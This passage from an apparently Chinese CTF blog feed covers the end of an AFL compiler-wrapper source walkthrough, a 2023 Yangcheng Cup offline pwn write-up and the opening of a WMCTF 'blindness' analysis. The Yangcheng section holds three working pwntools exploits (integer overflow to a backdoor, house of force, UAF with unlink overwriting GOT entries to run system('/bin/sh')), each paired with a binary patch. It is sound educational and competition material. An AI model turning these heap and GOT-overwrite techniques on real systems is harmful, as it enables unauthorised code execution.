class="hljs-string">&quot;-O3&quot;</span>;    <span class="hljs-comment">// 默认开启-O3优化</span><br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-funroll-loops&quot;</span>;<br><br>    <span class="hljs-comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span><br><span class="hljs-comment">       AFL-specific, the other is shared with libfuzzer. */</span><br><br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-D__AFL_COMPILER=1&quot;</span>;     <br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;       <span class="hljs-comment">//  获取环境变量AFL_NO_BUILTIN的值，若为真，则追加以下参数</span><br><br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strcmp&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strncmp&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strcasecmp&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strncasecmp&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-memcmp&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strstr&quot;</span>;<br>    cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strcasestr&quot;</span>;<br><br>  &#125;<br><br>  cc_params[cc_par_cnt] = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// cc_params最后追加NULL，表示参数数组结束</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>参考链接</strong></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://hollk.blog.csdn.net/category_11470526.html">https://hollk.blog.csdn.net/category_11470526.html</a></p><p><a href="https://paper.seebug.org/1732/">https://paper.seebug.org/1732/</a></p><p><a href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-羊城杯线下-pwn-wp</title>
    <link href="/2023/09/11/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-pwn-wp/"/>
    <url>/2023/09/11/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-pwn-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-羊城杯-pwn-wp"><a href="#2023-羊城杯-pwn-wp" class="headerlink" title="2023-羊城杯-pwn-wp"></a>2023-羊城杯-pwn-wp</h1><h2 id="arrary-index-bank"><a href="#arrary-index-bank" class="headerlink" title="arrary_index_bank"></a>arrary_index_bank</h2><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>整数溢出，泄露程序地址，覆盖返回地址为后门地址。</p><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230912000231865.png" alt="image-20230912000231865"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;10.1.102.102&#x27;</span>, <span class="hljs-number">10000</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;You current have&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Whose account?&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">0x8000000000000000</span> + idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">idx, data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;You current have&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Whose account?&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">0x8000000000000000</span> + idx))   <span class="hljs-comment"># 7 ret</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;How much?&#x27;</span>, <span class="hljs-built_in">str</span>(data))<br><br><br>show(<span class="hljs-number">7</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;] = &#x27;</span>)<br>codebase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">10</span>) - <span class="hljs-number">0x151b</span><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, codebase)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x14D2)&#x27;)</span><br><br>backdoor = codebase + <span class="hljs-number">0x1315</span><br>write(<span class="hljs-number">7</span>, backdoor)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;You current have&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>将两处有符号数比较patch为无符号数比较即可。</p><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230912001210491.png" alt="image-20230912001210491"></p><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230912001354980.png" alt="image-20230912001354980"></p><h2 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h2><h3 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h3><p>堆溢出 + house of force。</p><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230912000533158.png" alt="image-20230912000533158"></p><p>思路：</p><ol><li><p>申请大堆块泄露libc地址，泄露heap地址</p></li><li><p>堆溢出覆盖top_chunk大小为-1</p></li><li><p>覆盖malloc_got为system</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, u64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;10.1.102.102&#x27;</span>, <span class="hljs-number">10002</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;away&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, data</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;which index?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendlineafter(<span class="hljs-string">&#x27;space do u want?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;what to write?&#x27;</span>, data)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x60000</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;the balckbroad on &#x27;</span>)<br><span class="hljs-comment"># libc_base = int(p.recvuntil(b&#x27; &#x27;), 16) - 0x585010</span><br>libc_base = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x58b010</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;the balckbroad on &#x27;</span>)<br>ptr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>), <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;ptr: &#x27;</span>, ptr)<br><br>malloc_got = elf.got[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br><br>top_chunk = ptr + <span class="hljs-number">0x10</span><br>target_addr = malloc_got - <span class="hljs-number">0x20</span> - top_chunk<br>add(<span class="hljs-number">2</span>, target_addr, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x18</span>, p64(system) * <span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;which index?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;space do u want?&#x27;</span>, <span class="hljs-built_in">str</span>(ptr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>将heap overflow固定大小修复为输入大小。</p><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230912001627658.png" alt="image-20230912001627658"></p><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230912001643985.png" alt="image-20230912001643985"></p><h2 id="Printf-but-not-fmtstr"><a href="#Printf-but-not-fmtstr" class="headerlink" title="Printf_but_not_fmtstr"></a>Printf_but_not_fmtstr</h2><h3 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h3><p>uaf漏洞，限制了IO操作，且程序无法通过<code>exit</code>退出。</p><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230912000754833.png" alt="image-20230912000754833"></p><p>思路：</p><ol><li>uaf泄露libc地址</li><li>简单堆风水触发unlink，劫持heap数组</li><li>任意地址写，覆盖free_got为system</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;10.1.102.102&#x27;</span>, <span class="hljs-number">10001</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x580</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x580</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x580</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1f6cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base: &#x27;</span>, libc_base)<br><br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x590</span>)<br>edit(<span class="hljs-number">1</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x581</span>, <span class="hljs-number">0x4040E8</span> - <span class="hljs-number">0x18</span>, <span class="hljs-number">0x4040E8</span> - <span class="hljs-number">0x10</span>]))<br>delete(<span class="hljs-number">2</span>)<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>edit(<span class="hljs-number">1</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, free_got]))<br>edit(<span class="hljs-number">0</span>, p64(system))<br><br><span class="hljs-comment"># dbg()</span><br><br>delete(<span class="hljs-number">2</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h3><p>修改前汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">.text:00000000004014A1                               loc_4014A1:<br>.text:00000000004014A1 8B 45 F4                      mov     eax, [rbp+var_C]<br>.text:00000000004014A4 89 C0                         mov     eax, eax<br>.text:00000000004014A6 48 8D 14 C5 00 00 00 00       lea     rdx, ds:0[rax*8]<br>.text:00000000004014AE 48 8D 05 2B 2C 00 00          lea     rax, heap<br>.text:00000000004014B5 48 8B 04 02                   mov     rax, [rdx+rax]<br>.text:00000000004014B9 48 89 C7                      mov     rdi, rax              ; ptr<br>.text:00000000004014BC E8 DF 2C 00 00                call    free<br>.text:00000000004014C1                               loc_4014C1:<br>.text:00000000004014C1 90                            nop<br></code></pre></td></tr></table></figure><p>修改后汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">.text:00000000004014A1                               loc_4014A1:<br>.text:00000000004014A1 8B 45 F4                      mov     eax, [rbp+var_C]<br>.text:00000000004014A4 89 C0                         mov     eax, eax<br>.text:00000000004014A6 48 8D 14 C5 00 00 00 00       lea     rdx, ds:0[rax*8]<br>.text:00000000004014AE 48 8D 05 2B 2C 00 00          lea     rax, heap<br>.text:00000000004014B5 48 8B 04 02                   mov     rax, [rdx+rax]<br>.text:00000000004014B9 48 89 C7                      mov     rdi, rax              ; ptr<br>.text:00000000004014BC E9 97 0C 00 00                jmp     loc_402158<br>.text:00000000004014C1                               loc_4014C1:<br>.text:00000000004014C1 90                            nop<br><br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">0000000000402158</span>                               loc_402158:<br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">0000000000402158</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">05</span> <span class="hljs-number">81</span> <span class="hljs-number">1</span>F <span class="hljs-number">00</span> <span class="hljs-number">00</span>          lea     rax, heap<br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">000000000040215</span>F <span class="hljs-number">48</span> <span class="hljs-number">8</span>B <span class="hljs-number">04</span> <span class="hljs-number">10</span>                   <span class="hljs-keyword">mov</span>     rax, [rax+rdx]<br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">0000000000402163</span> <span class="hljs-number">48</span> C7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     qword ptr [rax], <span class="hljs-number">0</span><br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">000000000040216</span>A <span class="hljs-number">90</span>                            <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">000000000040216</span>B E8 <span class="hljs-number">30</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">call</span>    free<br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">000000000040216</span>B<br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">0000000000402170</span> <span class="hljs-number">90</span>                            <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">0000000000402171</span> E9 <span class="hljs-number">4</span>B F3 FF FF                <span class="hljs-keyword">jmp</span>     loc_4014C1<br><span class="hljs-symbol">.eh_frame:</span><span class="hljs-number">0000000000402171</span><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-pwn-wp/image-20230911002451369.png" alt="image-20230911002451369"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-wmctf-pwn部分复现</title>
    <link href="/2023/08/24/2023-wmctf-pwn%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/08/24/2023-wmctf-pwn%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-wmctf-pwn部分复现"><a href="#2023-wmctf-pwn部分复现" class="headerlink" title="2023-wmctf-pwn部分复现"></a>2023-wmctf-pwn部分复现</h1><p>师傅们太强了，pwn题拿了三个一血。笔者这次比赛就看了两个题，jit与blindness。说实话，jit太难逆了，根本看不懂。blindness看着挺简单的，但是没啥利用思路。还是太菜了。</p><h2 id="jit"><a href="#jit" class="headerlink" title="jit"></a>jit</h2><p>参考笔者<a href="https://lst-oss.github.io/2023/08/23/jit-pwn/#2023-wmctf-jit">jit-pwn</a>这篇文章。</p><h2 id="blindness"><a href="#blindness" class="headerlink" title="blindness"></a>blindness</h2><p>查看保护。</p><p><img src="/img/2023-wmctf-pwn%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image-20230828120349402.png" alt="image-20230828120349402"></p><p>程序整体还是比较简单的。关键在<code>executeBrainfuck</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">executeBrainfuck</span><span class="hljs-params">(<span class="hljs-type">char</span> *code)</span><br>&#123;<br>  <span class="hljs-type">char</span> c[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+13h] [rbp-5h]</span><br><br>  c[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>  *(_DWORD *)c = (<span class="hljs-type">unsigned</span> __int8)*code;<br>  <span class="hljs-keyword">while</span> ( *(<span class="hljs-type">int</span> *)&amp;c[<span class="hljs-number">1</span>] &lt;= <span class="hljs-number">255</span> 